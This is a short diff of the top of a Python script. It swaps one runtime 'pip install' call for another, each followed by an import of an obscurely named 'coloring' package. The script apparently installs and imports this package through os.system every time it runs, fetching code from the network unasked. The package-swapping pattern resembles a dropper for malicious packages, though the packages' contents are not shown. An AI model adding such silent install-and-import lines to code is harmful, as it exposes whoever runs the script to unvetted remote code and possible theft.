@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncoloringspkgV2")
-import pythoncoloringspkgV2
+os.system("pip install syscoloringaddons")
+import syscoloringaddons
 import random
 import requests
 import time
